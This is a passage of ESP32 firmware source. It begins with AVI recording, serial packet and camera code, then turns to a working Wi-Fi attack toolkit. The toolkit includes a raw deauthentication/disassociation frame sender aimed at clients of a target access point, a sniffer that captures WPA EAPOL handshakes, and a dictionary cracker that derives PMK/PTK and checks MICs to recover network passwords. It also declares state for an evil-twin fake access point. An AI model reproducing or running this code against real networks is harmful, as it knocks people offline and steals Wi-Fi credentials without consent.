  writeLE32(f, REC_AUDIO_RATE);
  writeLE32(f, REC_AUDIO_RATE * 2);
  writeLE16(f, 2);
  writeLE16(f, 16);

  uint32_t aStrlEnd = (uint32_t)f.position();
  f.seek(aStrlSizePos);
  writeLE32(f, aStrlEnd - (aStrlSizePos + 4));
  f.seek(aStrlEnd);

  uint32_t hdrlEnd = (uint32_t)f.position();
  f.seek(hdrlSizePos);
  writeLE32(f, hdrlEnd - (hdrlSizePos + 4));
  f.seek(hdrlEnd);

  writeFourCC(f, "LIST");
  recMoviListSizePos = (uint32_t)f.position();
  writeLE32(f, 0);
  writeFourCC(f, "movi");
  recMoviStartPos = (uint32_t)f.position();
  return true;
}

static void aviWriteChunk(const char id[4], const uint8_t *data, uint32_t len) {
  if (!recAviFile) return;
  writeFourCC(recAviFile, id);
  writeLE32(recAviFile, len);
  if (len > 0) recAviFile.write(data, len);
  if (len & 1) recAviFile.write((uint8_t)0);
}

static void aviFinalize() {
  if (!recAviFile) return;
  uint32_t fileEnd = (uint32_t)recAviFile.position();

  if (recMoviListSizePos > 0) {
    recAviFile.seek(recMoviListSizePos);
    writeLE32(recAviFile, fileEnd - (recMoviListSizePos + 4));
  }
  if (recAviFramesPos > 0) {
    recAviFile.seek(recAviFramesPos);
    writeLE32(recAviFile, recVideoFrames);
  }
  if (recVidFramesPos > 0) {
    recAviFile.seek(recVidFramesPos);
    writeLE32(recAviFile, recVideoFrames);
  }
  if (recAudLengthPos > 0) {
    recAviFile.seek(recAudLengthPos);
    writeLE32(recAviFile, recAudioBytes / 2);
  }
  if (recRiffSizePos > 0) {
    recAviFile.seek(recRiffSizePos);
    writeLE32(recAviFile, fileEnd - 8);
  }
  recAviFile.seek(fileEnd);
  recAviFile.flush();
}

static bool readFileExact(File &f, uint8_t *dst, size_t len) {
  size_t off = 0;
  while (off < len) {
    int n = f.read(dst + off, len - off);
    if (n <= 0) return false;
    off += (size_t)n;
  }
  return true;
}

static int16_t readSample16(const uint8_t *src) {
  int16_t v = 0;
  memcpy(&v, src, sizeof(v));
  return v;
}

static void writeSample16(uint8_t *dst, int16_t v) {
  memcpy(dst, &v, sizeof(v));
}

static void fillAudioPadding(uint8_t *dst, size_t bytes, int16_t sample) {
  for (size_t i = 0; i + 1 < bytes; i += 2) {
    writeSample16(dst + i, sample);
  }
}

static uint32_t frameSig32(const uint8_t *buf, size_t len) {
  // Lightweight rolling signature to detect prolonged frozen camera output.
  uint32_t sig = 2166136261UL;
  if (!buf || len == 0) return sig;
  size_t step = 64;
  if (len < step) step = 1;
  for (size_t i = 0; i < len; i += step) {
    sig ^= (uint32_t)buf[i];
    sig *= 16777619UL;
  }
  return sig;
}

static void applyAudioPostFx(uint8_t *buf, size_t bytes, int32_t &dc, int32_t &lp) {
  for (size_t i = 0; i + 1 < bytes; i += 2) {
    int16_t s = readSample16(buf + i);
    dc = (dc * 255 + s) / 256;
    int32_t centered = (int32_t)s - dc;
    if (centered > -REC_AUDIO_NOISE_GATE && centered < REC_AUDIO_NOISE_GATE) {
      writeSample16(buf + i, 0);
      continue;
    }
    int32_t v = centered << REC_AUDIO_VOLUME_GAIN;
    lp = (lp * 3 + v) / 4;
    v = lp;
    if (v > 32767) v = 32767;
    if (v < -32768) v = -32768;
    writeSample16(buf + i, (int16_t)v);
  }
}

static bool buildAviFromRawFiles() {
  String rawVideoPath = recBaseName + ".vraw";
  String rawAudioPath = recBaseName + ".araw";
  String aviPath = recBaseName + ".avi";

  File vRaw = SD.open(rawVideoPath, FILE_READ);
  File aRaw = SD.open(rawAudioPath, FILE_READ);
  if (!vRaw || !aRaw) {
    sendStatusText("REC fail: raw open");
    if (vRaw) vRaw.close();
    if (aRaw) aRaw.close();
    return false;
  }

  if (SD.exists(aviPath)) SD.remove(aviPath);
  recAviFile = SD.open(aviPath, FILE_WRITE);
  if (!recAviFile) {
    sendStatusText("REC fail: AVI open");
    vRaw.close();
    aRaw.close();
    return false;
  }

  static uint8_t rgb565Frame[CAM_W * CAM_H * 2];
  static uint8_t bgrFrame[CAM_W * CAM_H * 3];
  static uint8_t lastBgrFrame[CAM_W * CAM_H * 3];
  bool haveLastFrame = false;
  static uint8_t audioBuf[1024];
  int16_t lastAudioSample = 0;
  uint32_t totalFrames = (uint32_t)(vRaw.size() / sizeof(rgb565Frame));
  uint32_t totalAudioBytes = (uint32_t)(aRaw.size() & ~((size_t)1));
  uint16_t muxFps = REC_FPS;

  if (!aviWriteHeader(recAviFile, muxFps)) {
    recAviFile.close();
    vRaw.close();
    aRaw.close();
    sendStatusText("REC fail: AVI header");
    return false;
  }

  recVideoFrames = 0;
  recAudioBytes = 0;

  // Drive AVI duration from audio timeline to keep A/V in lock-step.
  uint32_t framesFromAudio = 0;
  if (totalAudioBytes > 0) {
    framesFromAudio = (uint32_t)((((uint64_t)totalAudioBytes * muxFps) + ((REC_AUDIO_RATE * 2ULL) - 1ULL)) / (REC_AUDIO_RATE * 2ULL));
  }
  uint32_t totalMuxFrames = (framesFromAudio > 0) ? framesFromAudio : totalFrames;
  if (totalMuxFrames == 0 && totalFrames > 0) totalMuxFrames = totalFrames;

  // Resample source frames over full audio-timed output duration.
  uint32_t srcReadIndex = 0;

  for (uint32_t fi = 0; fi < totalMuxFrames; fi++) {
    uint32_t wantSrcIdx = 0;
    if (totalFrames > 1 && totalMuxFrames > 1) {
      wantSrcIdx = (uint32_t)(((uint64_t)fi * (uint64_t)(totalFrames - 1)) / (uint64_t)(totalMuxFrames - 1));
    }

    while (srcReadIndex <= wantSrcIdx && srcReadIndex < totalFrames) {
      if (!readFileExact(vRaw, rgb565Frame, sizeof(rgb565Frame))) {
        break;
      }
      for (size_t i = 0, o = 0; i < sizeof(rgb565Frame); i += 2, o += 3) {
        uint16_t p = (uint16_t)((uint16_t)rgb565Frame[i] << 8) | (uint16_t)rgb565Frame[i + 1];
        uint8_t r = (uint8_t)(((p >> 11) & 0x1F) * 255 / 31);
        uint8_t g = (uint8_t)(((p >> 5) & 0x3F) * 255 / 63);
        uint8_t b = (uint8_t)((p & 0x1F) * 255 / 31);
        bgrFrame[o + 0] = b;
        bgrFrame[o + 1] = g;
        bgrFrame[o + 2] = r;
      }
      memcpy(lastBgrFrame, bgrFrame, sizeof(bgrFrame));
      haveLastFrame = true;
      srcReadIndex++;
    }

    if (haveLastFrame) {
      aviWriteChunk("00db", lastBgrFrame, (uint32_t)sizeof(lastBgrFrame));
      recVideoFrames++;
    }

    uint32_t desiredAudioTotal = (uint32_t)(((uint64_t)(fi + 1) * REC_AUDIO_RATE * 2ULL) / muxFps);
    if (desiredAudioTotal > totalAudioBytes) desiredAudioTotal = totalAudioBytes;
    uint32_t chunkNeed = (desiredAudioTotal > recAudioBytes) ? (desiredAudioTotal - recAudioBytes) : 0;
    chunkNeed &= ~((uint32_t)1);

    if (chunkNeed > 0) {
      uint32_t remaining = chunkNeed;
      while (remaining > 0) {
        size_t ask = remaining;
        if (ask > sizeof(audioBuf)) ask = sizeof(audioBuf);
        size_t got = 0;
        while (got < ask) {
          int n = aRaw.read(audioBuf + got, ask - got);
          if (n <= 0) break;
          got += (size_t)n;
        }
        if (got >= 2) {
          size_t gotAligned = got & ~((size_t)1);
          lastAudioSample = readSample16(audioBuf + (gotAligned - 2));
        }
        if (got < ask) {
          size_t gotAligned = got & ~((size_t)1);
          fillAudioPadding(audioBuf + gotAligned, ask - gotAligned, lastAudioSample);
        }
        aviWriteChunk("01wb", audioBuf, (uint32_t)ask);
        recAudioBytes += (uint32_t)ask;
        remaining -= (uint32_t)ask;
      }
    }

    if ((fi & 0x07U) == 0U) {
      yield();
    }
  }

  aviFinalize();
  recAviFile.close();
  vRaw.close();
  aRaw.close();

  sendStatusText(String("REC mux fps ") + String(muxFps) + " F" + String(totalFrames) + " A" + String((unsigned long)totalAudioBytes));

  if (!REC_KEEP_RAW_FILES) {
    if (SD.exists(rawVideoPath)) SD.remove(rawVideoPath);
    if (SD.exists(rawAudioPath)) SD.remove(rawAudioPath);
  }

  return true;
}

static uint8_t crc8Update(uint8_t crc, uint8_t data) {
  crc ^= data;
  for (int i = 0; i < 8; i++) {
    crc = (crc & 0x80) ? (uint8_t)((crc << 1) ^ 0x31) : (uint8_t)(crc << 1);
  }
  return crc;
}

static uint8_t crc8Buf(const uint8_t *buf, size_t len) {
  uint8_t c = 0;
  for (size_t i = 0; i < len; i++) c = crc8Update(c, buf[i]);
  return c;
}

static void sendPacket(uint8_t type, const uint8_t *payload, uint16_t len) {
  uint8_t hdr[5];
  hdr[0] = PKT_HEAD1;
  hdr[1] = PKT_HEAD2;
  hdr[2] = type;
  hdr[3] = (uint8_t)(len & 0xFF);
  hdr[4] = (uint8_t)((len >> 8) & 0xFF);

  uint8_t crc = 0;
  crc = crc8Update(crc, hdr[2]);
  crc = crc8Update(crc, hdr[3]);
  crc = crc8Update(crc, hdr[4]);
  if (payload && len) {
    for (uint16_t i = 0; i < len; i++) {
      crc = crc8Update(crc, payload[i]);
    }
  }

  Serial1.write(hdr, sizeof(hdr));
  if (payload && len) Serial1.write(payload, len);
  Serial1.write(crc);
  Serial1.write(PKT_TAIL1);
  Serial1.write(PKT_TAIL2);
}

static void sendStatusText(const String &s) {
  String msg = s;
  if (msg.length() > 220) msg = msg.substring(0, 220);
  sendPacket(PKT_STATUS, (const uint8_t *)msg.c_str(), (uint16_t)msg.length());
}

static void sendSdList() {
  if (!sdReady) {
    sendStatusText("SD not ready");
    uint8_t st = 0;
    sendPacket(PKT_SD_LIST_END, &st, 1);
    return;
  }
  File root = SD.open("/");
  if (!root || !root.isDirectory()) {
    sendStatusText("SD open root failed");
    uint8_t st = 0;
    sendPacket(PKT_SD_LIST_END, &st, 1);
    return;
  }

  String chunk = "";
  uint32_t fileCount = 0;
  File f = root.openNextFile();
  while (f) {
    if (!f.isDirectory()) {
      fileCount++;
      String line = String(f.name()) + "\t" + String((unsigned long)f.size()) + "\n";
      if (chunk.length() + line.length() > 220) {
        sendPacket(PKT_SD_LIST_CHUNK, (const uint8_t *)chunk.c_str(), (uint16_t)chunk.length());
        chunk = "";
      }
      chunk += line;
    }
    f.close();
    f = root.openNextFile();
    yield();
  }
  root.close();
  if (chunk.length() > 0) {
    sendPacket(PKT_SD_LIST_CHUNK, (const uint8_t *)chunk.c_str(), (uint16_t)chunk.length());
  }
  uint8_t st = 1;
  sendPacket(PKT_SD_LIST_END, &st, 1);
  sendStatusText(String("SD list ") + String((unsigned long)fileCount) + " files");
}

static bool initSdCard() {
  sdSpi.begin(SD_SCK_PIN, SD_MISO_PIN, SD_MOSI_PIN, SD_CS_PIN);
  sdReady = SD.begin(SD_CS_PIN, sdSpi);
  if (sdReady) sendStatusText("SD ready");
  else sendStatusText("SD init failed");
  return sdReady;
}

static bool initMic() {
  micI2S.end();
  micI2S.setTimeout(80);
  micI2S.setPinsPdmRx(MIC_CLK_PIN, MIC_DATA_PIN);
  if (!micI2S.begin(I2S_MODE_PDM_RX, REC_AUDIO_RATE, I2S_DATA_BIT_WIDTH_16BIT, I2S_SLOT_MODE_MONO)) {
    micReady = false;
    sendStatusText("MIC i2s begin failed");
    return false;
  }

  // Prime the driver with a few reads to avoid startup pops and stale zeros.
  for (uint8_t i = 0; i < 4; i++) {
    (void)micI2S.read();
  }

  micReady = true;
  sendStatusText("MIC ready");
  return true;
}

static void applyImageControls() {
  if (!camSensor) return;

  camSensor->set_vflip(camSensor, CAM_SENSOR_VFLIP);
  camSensor->set_hmirror(camSensor, CAM_SENSOR_HMIRROR);
  camSensor->set_whitebal(camSensor, 1);
  camSensor->set_awb_gain(camSensor, 1);
  camSensor->set_wb_mode(camSensor, 0);
  camSensor->set_exposure_ctrl(camSensor, 1);
  camSensor->set_aec2(camSensor, 1);
  camSensor->set_ae_level(camSensor, -1);
  camSensor->set_gain_ctrl(camSensor, 1);
  camSensor->set_lenc(camSensor, 1);

  int8_t bri = constrain(cameraCtlBrightness, -2, 2);
  int8_t con = constrain(cameraCtlContrast, -2, 2);
  int8_t sat = constrain(cameraCtlSaturation, -2, 2);

  uint8_t fx = 0;
  switch (cameraCtlFilter) {
    case 1: // vivid
      sat = 2;
      con = 1;
      fx = 0;
      break;
    case 2: // B/W
      fx = 2;
      sat = -2;
      break;
    case 3: // sepia
      fx = 6;
      break;
    case 4: // cool
      fx = 4;
      break;
    case 5: // warm
      fx = 3;
      break;
    default: // natural
      fx = 0;
      break;
  }

  camSensor->set_special_effect(camSensor, fx);
  camSensor->set_brightness(camSensor, bri);
  camSensor->set_contrast(camSensor, con);
  camSensor->set_saturation(camSensor, sat);
}

static bool initCameraMode(bool still3mp, bool recordMode = false) {
  camera_config_t c;
  c.ledc_channel = LEDC_CHANNEL_0;
  c.ledc_timer = LEDC_TIMER_0;
  c.pin_d0 = Y2_GPIO_NUM;
  c.pin_d1 = Y3_GPIO_NUM;
  c.pin_d2 = Y4_GPIO_NUM;
  c.pin_d3 = Y5_GPIO_NUM;
  c.pin_d4 = Y6_GPIO_NUM;
  c.pin_d5 = Y7_GPIO_NUM;
  c.pin_d6 = Y8_GPIO_NUM;
  c.pin_d7 = Y9_GPIO_NUM;
  c.pin_xclk = XCLK_GPIO_NUM;
  c.pin_pclk = PCLK_GPIO_NUM;
  c.pin_vsync = VSYNC_GPIO_NUM;
  c.pin_href = HREF_GPIO_NUM;
  c.pin_sccb_sda = SIOD_GPIO_NUM;
  c.pin_sccb_scl = SIOC_GPIO_NUM;
  c.pin_pwdn = PWDN_GPIO_NUM;
  c.pin_reset = RESET_GPIO_NUM;
  c.xclk_freq_hz = 20000000;

  if (recordMode) {
    c.pixel_format = PIXFORMAT_JPEG;
    c.frame_size = FRAMESIZE_QVGA;
    c.jpeg_quality = 16;
    c.fb_count = 1;
    c.grab_mode = CAMERA_GRAB_LATEST;
  } else if (still3mp) {
    c.pixel_format = PIXFORMAT_JPEG;
    c.frame_size = FRAMESIZE_QXGA; // 2048x1536 (~3MP)
    c.jpeg_quality = 12;
    c.fb_count = 1;
    c.grab_mode = CAMERA_GRAB_LATEST;
  } else {
    c.pixel_format = PIXFORMAT_RGB565;
    c.frame_size = FRAMESIZE_96X96;
    c.jpeg_quality = 0;
    c.fb_count = 2;
    c.grab_mode = CAMERA_GRAB_LATEST;
  }

  if (!still3mp && !recordMode) {
    c.fb_count = 2;
  } else {
    c.fb_count = 1;
  }
  c.fb_location = CAMERA_FB_IN_PSRAM;

  esp_err_t err = esp_camera_init(&c);
  if (err != ESP_OK) {
    Serial.printf("Camera init err: 0x%x\n", err);
    return false;
  }

  camSensor = esp_camera_sensor_get();
  if (camSensor) {
    applyImageControls();
  }

  cameraStillMode = still3mp;
  cameraRecordMode = recordMode;
  cameraInitialized = true;
  return true;
}

static bool switchCameraMode(bool still3mp, bool recordMode = false) {
  if (cameraInitialized) {
    esp_camera_deinit();
    cameraInitialized = false;
    delay(80);
  }
  return initCameraMode(still3mp, recordMode);
}

static bool uartReadBytes(uint8_t *buf, uint16_t len, uint32_t timeoutMs) {
  uint16_t got = 0;
  uint32_t start = millis();
  while (got < len && (millis() - start) < timeoutMs) {
    int avail = Serial1.available();
    if (avail > 0) {
      uint16_t take = (uint16_t)min<int>(avail, len - got);
      int n = Serial1.readBytes((char *)(buf + got), take);
      if (n > 0) got += (uint16_t)n;
    } else {
      delay(1);
    }
  }
  return got == len;
}

static bool readPacket(uint8_t &type, uint8_t *payload, uint16_t payloadCap, uint16_t &outLen, uint32_t timeoutMs) {
  outLen = 0;

  uint32_t deadline = millis() + timeoutMs;
  uint8_t prev = 0;
  while ((int32_t)(deadline - millis()) > 0) {
    bool found = false;
    while ((int32_t)(deadline - millis()) > 0) {
      if (Serial1.available() > 0) {
        uint8_t b = (uint8_t)Serial1.read();
        if (prev == PKT_HEAD1 && b == PKT_HEAD2) {
          found = true;
          break;
        }
        prev = b;
      } else {
        delay(1);
      }
    }
    if (!found) break;

    uint8_t meta[3] = {0};
  if (!uartReadBytes(meta, sizeof(meta), 12)) return false;

    uint16_t len = (uint16_t)meta[1] | (uint16_t)((uint16_t)meta[2] << 8);
    if (len > payloadCap) {
      prev = 0;
      continue;
    }

    if (len > 0) {
      if (!uartReadBytes(payload, len, 30)) return false;
    }

    uint8_t rxCrc = 0;
    uint8_t tail[2] = {0};
    if (!uartReadBytes(&rxCrc, 1, 8)) return false;
    if (!uartReadBytes(tail, 2, 8)) return false;
    if (tail[0] != PKT_TAIL1 || tail[1] != PKT_TAIL2) {
      prev = tail[1];
      continue;
    }

    uint8_t calc = 0;
    calc = crc8Update(calc, meta[0]);
    calc = crc8Update(calc, meta[1]);
    calc = crc8Update(calc, meta[2]);
    for (uint16_t i = 0; i < len; i++) {
      calc = crc8Update(calc, payload[i]);
    }
    if (calc != rxCrc) {
      prev = 0;
      continue;
    }

    type = meta[0];
    outLen = len;
    return true;
  }

  return false;
}

// --- WIFI DEAUTH PACKET STRUCTURES ---
typedef struct {
  uint8_t frame_control[2] = { 0xC0, 0x00 };
  uint8_t duration[2] = { 0x00, 0x00 };
  uint8_t station[6];
  uint8_t sender[6];
  uint8_t access_point[6];
  uint8_t fragment_sequence[2] = { 0xF0, 0xFF };
  uint16_t reason;
} deauth_frame_t;

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t dest[6];
  uint8_t src[6];
  uint8_t bssid[6];
  uint16_t sequence_ctrl;
  uint8_t addr4[6];
} mac_hdr_t;

typedef struct {
  mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_packet_t;

// --- EXPORTED WIFI FUNCTIONS ---
bool deauthActive = false;
uint8_t deauthTarget[6];
int deauthChannel = 1;
uint16_t deauthReason = 1;
uint32_t deauthLastSendMs = 0;
uint32_t deauthPkts = 0;
uint16_t deauthSeqNum = 0;

// (LAN Scan moved to Matrix)

// --- FILE PULL STATE ---
bool pullActive = false;
File pullFile;
uint16_t pullSeq = 0;

// --- EVIL TWIN STATE & DATA ---
bool evilTwinActive = false;
DNSServer evilDnsServer;
WebServer evilServer(80);
String evilTwinTargetSsid = "";

// PCAP saving definitions
#define PCAP_Q_SIZE 8
typedef struct {
  uint16_t len;
  uint8_t data[256];
  uint32_t ts;
} PcapPkt;
static PcapPkt pcapQueue[PCAP_Q_SIZE];
static volatile uint8_t pcapHead = 0;
static volatile uint8_t pcapTail = 0;
static bool pcapActive = false;
static File pcapFile;

const uint8_t pcap_global_hdr[24] = {
  0xd4, 0xc3, 0xb2, 0xa1, 0x02, 0x00, 0x04, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xff, 0xff, 0x00, 0x00, 0x69, 0x00, 0x00, 0x00
};

// --- WPA CRACKER STATE & DATA ---
bool wpaCaptureActive = false;
bool wpaCrackActive = false;
bool wpaHandshakeFound = false;
volatile uint32_t wpaCapDataFrames = 0;
volatile uint32_t wpaCapEapolFrames = 0;
volatile bool wpaCapSawTraffic = false;
volatile bool wpaCapSawM1 = false;
volatile bool wpaCapSawM2 = false;
uint8_t wpaTargetBssid[6];    // AP MAC
uint8_t wpaTargetStation[6];  // STA MAC
uint8_t wpaAnonce[32];
uint8_t wpaSnonce[32];
uint8_t wpaMic[16];
uint8_t wpaEapolFrame[256];
uint16_t wpaEapolSize = 0;
String wpaTargetSsid = "";
String wpaDictFile = "";
File wpaDictHandle;
uint32_t wpaCrackCount = 0;
uint32_t wpaCrackChecked = 0;
bool xiaoReportDict = false;
bool wpaCrackDone = false;
String wpaCrackPassword = "";
uint32_t wpaLastStatMs = 0;
uint32_t wpaLastInsightMs = 0;
uint8_t wpaCaptureChannel = 0;
bool xiaoCrackBoostActive = false;
uint16_t xiaoCrackPrevCpuMhz = 240;
static const uint8_t WPA_CRACK_LINES_PER_LOOP = 20;
// --------------------------------

static void xiaoStopWpaCapture() {
  if (!wpaCaptureActive) return;
  wpaCaptureActive = false;
  if (pcapActive && pcapFile) {
    pcapFile.close();
    pcapActive = false;
  }
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_set_promiscuous(false);
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, true);
}

static void xiaoEnterCrackBoost() {
  if (xiaoCrackBoostActive) return;

  xiaoCrackPrevCpuMhz = (uint16_t)getCpuFrequencyMhz();
  if (xiaoCrackPrevCpuMhz != 240) {
    setCpuFrequencyMhz(240);
  }

  if (xiaoAudioRecActive) {
    xiaoStopAudioRec();
  }

  if (xiaoWebRunning) {
    xiaoStopWebServer(true);
  } else {
    xiaoPowerDownWifi();
  }

  if (cameraInitialized) {
    esp_camera_deinit();
    cameraInitialized = false;
    cameraStillMode = false;
    cameraRecordMode = false;
    camSensor = nullptr;
  }

  xiaoCrackBoostActive = true;
  sendStatusText("WPA_CRACK boost=ON cpu=240 svc=OFF");
}

static void xiaoExitCrackBoost() {
  if (!xiaoCrackBoostActive) return;

  if (!cameraInitialized) {
    if (!initCameraMode(false, false)) {
      sendStatusText("WPA_CRACK boost=OFF cam_init_fail");
    }
  }

  if (xiaoCrackPrevCpuMhz != 240) {
    setCpuFrequencyMhz(xiaoCrackPrevCpuMhz);
  }

  xiaoCrackBoostActive = false;
  sendStatusText(String("WPA_CRACK boost=OFF cpu=") + String((unsigned long)getCpuFrequencyMhz()));
}

static bool xiaoWpaCheckPassword(const char* password, const char* ssid, uint8_t* apMac, uint8_t* staMac, uint8_t* anonce, uint8_t* snonce, uint8_t* eapolFrame, uint16_t eapolSize, uint8_t* expectedMic) {
    uint8_t pmk[32];
    const mbedtls_md_info_t *info_sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
  if (!info_sha1) return false;

    // 1. Calculate PMK (PBKDF2 HMAC-SHA1)
  int pbkdf2Rc = mbedtls_pkcs5_pbkdf2_hmac_ext(
    MBEDTLS_MD_SHA1,
    (const unsigned char *)password,
    strlen(password),
    (const unsigned char *)ssid,
    strlen(ssid),
    4096,
    32,
    pmk);
  if (pbkdf2Rc != 0) return false;

    // 2. Prepare Data for PRF
    uint8_t data[76];
    if (memcmp(apMac, staMac, 6) < 0) { memcpy(data, apMac, 6); memcpy(data+6, staMac, 6); }
    else { memcpy(data, staMac, 6); memcpy(data+6, apMac, 6); }
    
    if (memcmp(anonce, snonce, 32) < 0) { memcpy(data+12, anonce, 32); memcpy(data+44, snonce, 32); }
    else { memcpy(data+12, snonce, 32); memcpy(data+44, anonce, 32); }

    // 3. Compute PTK (PRF-512)
    const char* prefix = "Pairwise key expansion";
    uint8_t input[100];
    int prefix_len = 22; // length of "Pairwise key expansion"
    memcpy(input, prefix, prefix_len + 1); // include null terminator
    memcpy(input + prefix_len + 1, data, 76);
    
    uint8_t ptk[80]; // Diperbaiki: WPA PRF-512 dengan HMAC-SHA1 butuh 80 bytes (4 iterasi * 20 byte)
    for(int i = 0; i < 4; i++) {
      input[prefix_len + 1 + 76] = i;
      if (mbedtls_md_hmac(info_sha1, pmk, 32, input, prefix_len + 1 + 76 + 1, &ptk[i*20]) != 0) {
        return false;
      }
    }

    uint8_t key_desc_ver = eapolFrame[6] & 0x07;

    // 4. Compute MIC
    // PTK[0..15] adalah Key Confirmation Key (KCK).
    uint8_t mic[20];
    if (key_desc_ver == 1) { // WPA1 TKIP use HMAC-MD5
      const mbedtls_md_info_t *info_md5 = mbedtls_md_info_from_type(MBEDTLS_MD_MD5);
      if (mbedtls_md_hmac(info_md5, ptk, 16, eapolFrame, eapolSize, mic) != 0) return false;
    } else { // WPA2 CCMP use HMAC-SHA1
      if (mbedtls_md_hmac(info_sha1, ptk, 16, eapolFrame, eapolSize, mic) != 0) return false;
    }

    return (memcmp(mic, expectedMic, 16) == 0);
}

void xiaoPerformDeauth(uint8_t* targetMac, uint8_t* apMac) {
    uint8_t raw_deauth[26] = {
        0xC0, 0x00,                         // frame control (Deauth)
        0x00, 0x00,                         // duration 0
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // addr1 (target)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // addr2 (apMac)
        0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // addr3 (apMac)
        0x00, 0x00,                         // sequence
        0x01, 0x00                          // reason
    };
    
    memcpy(&raw_deauth[4], targetMac, 6);
    memcpy(&raw_deauth[10], apMac, 6);
    memcpy(&raw_deauth[16], apMac, 6);
    
    // Set sequence number
    raw_deauth[22] = (deauthSeqNum % 0xFF) << 4;
    raw_deauth[23] = (deauthSeqNum / 0xFF);
    deauthSeqNum++;
    
    // Set reason
    raw_deauth[24] = deauthReason & 0xFF;
    raw_deauth[25] = (deauthReason >> 8) & 0xFF;

    // 1. Send Deauth
    raw_deauth[0] = 0xC0;
    esp_wifi_80211_tx(WIFI_IF_AP, raw_deauth, sizeof(raw_deauth), false);

    // 2. Send Disassociate
    raw_deauth[0] = 0xA0; 
    esp_wifi_80211_tx(WIFI_IF_AP, raw_deauth, sizeof(raw_deauth), false);
}

IRAM_ATTR void xiaoDeauthSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < sizeof(mac_hdr_t)) return;

    wifi_packet_t* packet = (wifi_packet_t*)pkt->payload;
    mac_hdr_t* hdr = &packet->hdr;
    
    // --- 1. WPA EAPOL HANDSHAKE SNIFFER ---
    if (wpaCaptureActive && type == WIFI_PKT_DATA) {
      uint8_t* p = pkt->payload;
      uint16_t len = pkt->rx_ctrl.sig_len;
      if (len >= 24) {
        uint16_t fc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
        uint8_t frameType = (uint8_t)((fc >> 2) & 0x03);
        uint8_t subType = (uint8_t)((fc >> 4) & 0x0F);
        bool toDs = (fc & 0x0100) != 0;
        bool fromDs = (fc & 0x0200) != 0;

        int payload_offset = 24;
        if (toDs && fromDs) payload_offset = 30;      // Addr4 present
        if ((subType & 0x08) != 0) payload_offset += 2; // QoS Control present

        if (frameType == 2 && len > (uint16_t)(payload_offset + 8)) {
          // Cek relasi frame terhadap AP target
          bool fromAP = (memcmp(hdr->src, wpaTargetBssid, 6) == 0);
          bool toAP = (memcmp(hdr->dest, wpaTargetBssid, 6) == 0);
          bool bssidMatch = (memcmp(hdr->bssid, wpaTargetBssid, 6) == 0);

          if (fromAP || toAP || bssidMatch) {
            wpaCapSawTraffic = true;
            wpaCapDataFrames++;

            // LLC SNAP + EtherType EAPOL (0x888E)
            if (p[payload_offset] == 0xAA && p[payload_offset + 1] == 0xAA && p[payload_offset + 2] == 0x03 &&
              p[payload_offset + 6] == 0x88 && p[payload_offset + 7] == 0x8E) {
              wpaCapEapolFrames++;

              int eapol_offset = payload_offset + 8;
              if (len > (uint16_t)(eapol_offset + 7)) {
                uint8_t eapol_type = p[eapol_offset + 1];
                if (eapol_type == 3) { // EAPOL-Key
                  uint16_t eapol_len = ((uint16_t)p[eapol_offset + 2] << 8) | (uint16_t)p[eapol_offset + 3];
                  uint16_t eapol_total = (uint16_t)(eapol_len + 4);
                  uint16_t max_avail = (uint16_t)(len - eapol_offset);
                  if (eapol_total > max_avail) eapol_total = max_avail;

                  uint16_t key_info = ((uint16_t)p[eapol_offset + 5] << 8) | (uint16_t)p[eapol_offset + 6];
                  bool keyPairwise = (key_info & 0x0008) != 0;
                  bool keyInstall = (key_info & 0x0040) != 0;
                  bool keyAck = (key_info & 0x0080) != 0;
                  bool keyMic = (key_info & 0x0100) != 0;
                  bool keySecure = (key_info & 0x0200) != 0;

                  // Message 1/4: AP -> STA, ACK=1, MIC=0
                  if (fromAP && keyPairwise && keyAck && !keyMic) {
                    if (len >= (uint16_t)(eapol_offset + 17 + 32)) {
                      memcpy(wpaAnonce, &p[eapol_offset + 17], 32);
                      memcpy(wpaTargetStation, hdr->dest, 6);
                      wpaCapSawM1 = true;
                    }
                  }

                  // Message 2/4: STA -> AP, ACK=0, MIC=1, INSTALL=0, SECURE=0
                  if (toAP && keyPairwise && !keyAck && keyMic && !keyInstall && !keySecure) {
                    bool stationKnown = false;
                    for (int i = 0; i < 6; i++) {
                      if (wpaTargetStation[i] != 0) {
                        stationKnown = true;
                        break;
                      }
                    }

                    if (!stationKnown || memcmp(hdr->src, wpaTargetStation, 6) == 0) {
                      if (!stationKnown) memcpy(wpaTargetStation, hdr->src, 6);
                      if (len >= (uint16_t)(eapol_offset + 17 + 32) && len >= (uint16_t)(eapol_offset + 81 + 16)) {
                        memcpy(wpaSnonce, &p[eapol_offset + 17], 32);
                        memcpy(wpaMic, &p[eapol_offset + 81], 16);
                        wpaCapSawM2 = true;

                        if (eapol_total <= sizeof(wpaEapolFrame) && eapol_total >= 97) {
                          memcpy(wpaEapolFrame, &p[eapol_offset], eapol_total);
                          memset(&wpaEapolFrame[81], 0, 16); // Clear MIC for HMAC verification
                          wpaEapolSize = eapol_total;
                        }
                      }
                    }
                  }

                  if (wpaCapSawM1 && wpaCapSawM2 && wpaEapolSize > 0) {
                    wpaHandshakeFound = true;
                  }
                }
              }
            }
          }
        }
      }
    }
    // --------------------------------------

    if (!deauthActive) return;
    
    // Periksa apakah paket ini terkait dengan Target BSSID kita
    if (memcmp(hdr->bssid, deauthTarget, 6) == 0 || memcmp(hdr->dest, deauthTarget, 6) == 0 || memcmp(hdr->src, deauthTarget, 6) == 0) {
        
        // 1. Jika sumber paket BUKAN target BSSID, dan bukan Multicast/Broadcast (bit ke-0 dari byte pertama = 0)
        // Artinya: Ada client (HP/Laptop) yg sedang ngirim data ke AP target. Kita serang client tersebut.
        if ((hdr->src[0] & 0x01) == 0 && memcmp(hdr->src, deauthTarget, 6) != 0) {
            uint8_t mac[6];
            memcpy(mac, hdr->src, 6);
